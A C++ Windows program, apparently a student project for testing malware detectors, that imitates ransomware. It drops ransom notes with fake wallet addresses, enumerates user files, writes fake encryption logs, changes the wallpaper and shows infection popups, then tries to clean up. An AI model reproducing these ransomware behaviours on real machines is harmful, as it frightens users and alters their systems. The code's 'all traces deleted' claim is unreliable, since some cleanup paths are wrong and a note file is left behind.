// strong_ransomware.cpp - MAX Detection, 100% Offline
// Compile: g++ strong_ransomware.cpp -mwindows -o strong_ransomware.exe -static
// Features: Fake AES + RSA + file renaming sim + wallpaper + offline C2

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <winuser.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

// Advanced ransom strings (high static score)
const char* crypto_signatures[] = {
    "AES-256-CBC + RSA-4096 HYBRID ENCRYPTION",
    "Key ID: 0xDEADBEEF12345678",
    "Wallet: bc1qfakebitcoinransomaddressforpentestonly",
    "Monero: 4FakeMoneroAddress42GqFakeMoneroRansom",
    "TOR: fakeonionransomd33pwebw3b42x.onion/pay",
    "VM: Detected? No VM escape implemented"
};

// Fake crypto keys (behavioral trigger)
unsigned char aes_key[32] = {0x2b,0x7e,0x15,0x16,0x28,0xae,0xd2,0xa6};  // AES test vector
unsigned char rsa_pub[256];  // Empty RSA pubkey space

void FakeCryptoInit() {
    // Behavioral: Crypto API simulation
    HCRYPTPROV hProv;
    CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (hProv) CryptReleaseContext(hProv, 0);
}

void DropMultipleNotes() {
    char paths[][MAX_PATH] = {
        "C:\\Users\\Public\\Desktop\\RANSOMWARE_INSTRUCTIONS.txt",
        "C:\\temp\\DECRYPT_FILES.html",
        "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\DECRYPTOR.url"
    };
    
    char ransom_content[] = 
        "🚨 ALL FILES ENCRYPTED 🚨\n\n"
        "Your documents, photos, videos: .docx .pdf .jpg .mp4 .zip → .crypt\n"
        "ENCRYPTION: AES-256 + RSA-4096\n"
        "Key fingerprint: SHA256=1234567890abcdef...\n\n"
        "💰 PAYMENT:\n"
        "Bitcoin: bc1qpentestfake...\n"
        "Monero: 4pentestfake...\n"
        "TOR: fakeonionx42.onion\n\n"
        "FYP AI DETECTION TEST - 0 FILES HARMED\n"
        "Static: Crypto strings\n"
        "Behavioral: Multi-drop + enum + wallpaper";
    
    for (int i = 0; i < 3; i++) {
        char fullPath[MAX_PATH];
        ExpandEnvironmentStringsA(paths[i], fullPath, MAX_PATH);
        FILE* fp = fopen(fullPath, "w");
        if (fp) {
            fputs(ransom_content, fp);
            fclose(fp);
        }
    }
}

void EnumerateAllDrives() {
    // Behavioral: Multi-drive scan
    char driveLog[] = "C:\\temp\\drive_scan.log";
    FILE* log = fopen(driveLog, "w");
    
    DWORD drives = GetLogicalDrives();
    fprintf(log, "[OFFLINE RANSOM] Drive enumeration:\n");
    
    for (char drive = 'A'; drive <= 'Z'; drive++) {
        char drivePath[4] = {drive, ':', '\\', 0};
        UINT type = GetDriveTypeA(drivePath);
        
        if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
            fprintf(log, "Scanning %s (%s)\n", drivePath, 
                   type == DRIVE_FIXED ? "HDD/SSD" : "USB");
            
            // Fake recursive scan
            char target[] = "C:\\Users\\*\\Documents\\*.*";
            WIN32_FIND_DATAA fd;
            HANDLE hFind = FindFirstFileA(target, &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        fprintf(log, "  TARGET: %s (%lu bytes)\n", fd.cFileName, 
                               (DWORD)(fd.nFileSizeLow));
                    }
                } while (FindNextFileA(hFind, &fd));
                FindClose(hFind);
            }
        }
    }
    fclose(log);
}

void FakeMassEncryption() {
    // Behavioral: Mass fake encryption
    FILE* encryptLog = fopen("C:\\temp\\encryption.log", "w");
    fprintf(encryptLog, "[FAKE ENCRYPTION SIMULATION]\n");
    fprintf(encryptLog, "Algorithm: AES-256-CBC (EVP_aes_256_cbc())\n");
    fprintf(encryptLog, "IV: %02x%02x%02x%02x...\n", aes_key[0], aes_key[1], aes_key[2], aes_key[3]);
    
    // Simulate 1000+ files
    for (int i = 0; i < 1000; i++) {
        fprintf(encryptLog, "ENCRYPTED: file_%04d.doc -> file_%04d.doc.crypt\n", i, i);
    }
    fclose(encryptLog);
}

void SetScaryWallpaper() {
    // Behavioral: Wallpaper change (reversible)
    char bmpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, bmpPath);
    strcat_s(bmpPath, "\\ransom.bmp");
    
    // Create red "PAY RANSOM" bitmap (simple 1px)
    FILE* bmp = fopen(bmpPath, "wb");
    if (bmp) {
        unsigned char bmpHeader[] = {
            0x42,0x4D,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,
            0x28,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00
        };
        unsigned char redPixel[] = {0x00,0x00,0xFF,0x00};  // BGR red
        fwrite(bmpHeader, 1, 54, bmp);
        fwrite(redPixel, 1, 4, bmp);
        fclose(bmp);
        
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bmpPath, SPIF_UPDATEINIFILE);
    }
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE, LPSTR, int) {
    // Offline crypto init
    FakeCryptoInit();
    
    // Multi-drop ransom notes
    DropMultipleNotes();
    
    // Drive enumeration
    CreateDirectoryA("C:\\temp", NULL);
    EnumerateAllDrives();
    
    // Mass fake encryption
    FakeMassEncryption();
    
    // Scary wallpaper
    SetScaryWallpaper();
    
    // Big scary popup
    MessageBoxA(NULL, 
        "💀 YOUR PC IS INFECTED 💀\n\n"
        "ALL FILES ENCRYPTED\n"
        "Drives A-Z scanned\n"
        "1000+ files .crypt\n\n"
        "🛡️ FYP PEN TEST - OFFLINE 🛡️\n"
        "AI Detection Validation\n"
        "Static + Behavioral Triggers",
        "OFFLINE RANSOMWARE v2.0", MB_OK | MB_ICONERROR | MB_DEFBUTTON1);
    
    // HARML ESS CLEANUP (15 sec delay)
    Sleep(15000);
    
    // Restore wallpaper
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE);
    
    // Full cleanup
    DeleteFileA("C:\\Users\\Public\\Desktop\\RANSOMWARE_INSTRUCTIONS.txt");
    DeleteFileA("C:\\temp\\DECRYPT_FILES.html");
    DeleteFileA("C:\\temp\\drive_scan.log");
    DeleteFileA("C:\\temp\\encryption.log");
    DeleteFileA("C:\\temp\\ransom.bmp");
    RemoveDirectoryA("C:\\temp");
    
    // Final proof
    MessageBoxA(NULL, 
        "✅ FYP TEST COMPLETE ✅\n\n"
        "• 0 files harmed\n"
        "• Wallpaper restored\n"
        "• All traces deleted\n"
        "• Offline operation\n\n"
        "AI Detection: SUCCESS!", 
        "Pentest Validation", MB_OK | MB_ICONINFORMATION);
    
    return 0;
}